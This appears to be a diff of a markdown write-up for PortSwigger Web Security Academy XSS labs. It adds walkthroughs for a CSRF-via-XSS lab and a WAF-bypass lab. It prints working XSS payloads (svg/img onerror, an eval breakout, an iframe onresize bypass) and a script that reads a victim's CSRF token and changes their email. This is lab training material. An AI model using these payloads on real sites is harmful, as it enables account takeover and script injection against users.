@@ -100,7 +100,7 @@ Get detail at [here](https://portswigger.net/web-security/cross-site-scripting/d
 
 [Lab 3](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
 
-Description of this lab: perform a cross-site scripting attack that calls the alert function using document.write
+Description of this lab: perform a cross-site scripting attack that calls the alert function using `document.write`
 
 Check how website work, look at the source:
 ```js
@@ -115,7 +115,7 @@ Check how website work, look at the source:
     </script>
 ```
 
-We use document.write to insert plain HTML into the DOM (which opens the door for DOM XSS attacks). Moreover, if query is successful, website will load svg image. Type `"><svg onload=alert()>` (it will be triggered when svg load) into search bar, then solved the lab.
+We use `document.write` to insert plain HTML into the DOM (which opens the door for DOM XSS attacks). Moreover, if query is successful, website will load svg image. Type `"><svg onload=alert()>` (it will be triggered when svg load) into search bar, then solved the lab.
 
 [Lab 4](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
 
@@ -135,7 +135,7 @@ Check how website work, look at the source:
                         
 ```
 
-Try to find cheatsheet with keyword `innerHTML` and found this:
+Try to find cheat sheet with keyword `innerHTML` and found this:
 ```js
     '<img/src/onerror=alert(1)>';</script>
 ```
@@ -203,7 +203,7 @@ Open detail of any product, at the end of the page, it has `Check stock`. When u
     </script>
 ```
 
-Moreover, we can modify URL parameter to send value of storeId to server, and we can exploit variable `store`. The final payload `product?productId=1&storeId="></select><img src=1 onerror=alert()>` and the lab will be solved.
+Moreover, we can modify URL parameter to send value of `storeId` to server, and we can exploit variable `store`. The final payload `product?productId=1&storeId="></select><img src=1 onerror=alert()>` and the lab will be solved.
 
 The code after use payload
 ```html
@@ -240,11 +240,45 @@ Check the source code, and we found a JS file `searchResults.js` which is runnin
         ...
 ```
 
-Analyze this code, we can see that this function using `eval()` - popular dangerous function and we need to trigger `eval()` function with `alert(1)`, the final payload is `\"-alert(1)}//` (using `\"` to prevent escape backslash) then solved the lab. We can see this work in response of request `GET /search-results?search=%5C%22-alert%281%29%7D%2F%2F `
+Analyze this code, we can see that this function using `eval()` - popular dangerous function, and we need to trigger `eval()` function with `alert(1)`, the final payload is `\"-alert(1)}//` (using `\"` to escape backslash) then solved the lab. We can see this work in response of request `GET /search-results?search=%5C%22-alert%281%29%7D%2F%2F `
 
 ```json
     {"results":[],"searchTerm":"\\"-alert(1)}//"}
 ```
+
+[Lab 17](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+
+Description of this lab: exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments
+
+Log in with wiener:peter, and change the email address of wiener, and inspect request with Burp Suite, we can see that this request is `POST /my-account/change-email` with `csrf` and `email` parameters. We can use this request to change email address of wiener. 
+
+Using this script in exploit server which change to email `test@example.com` for every user who visit the post
+
+
+```js
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = handleResponse; // callback function
+        req.open('get','/my-account',true);
+        req.send();
+        function handleResponse() {
+            var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+            var changeReq = new XMLHttpRequest();
+            changeReq.open('post', '/my-account/change-email', true);
+            changeReq.send('csrf='+token+'&email=test@example.com')
+        };
+    </script>
+```
+
+[Lab 18](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+
+Description of this lab: perform a cross-site scripting attack that bypasses the `WAF` and calls the print() function
+
+Try with this payload `<img src=1 onerror=print()>` in search bar, and we can see that this website block some tags and attributes. We can use `iframe` to bypass this policy. However, we can't use `onload` attribute, so we need to use `onresize` attribute. The payload is `"><body onresize=print()>`
+
+Using this script for exploit server, and solved the lab.
+
+`<iframe src="https://0a56003c034b042cc2e7071f0090002b.web-security-academy.net/search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
 
 
 
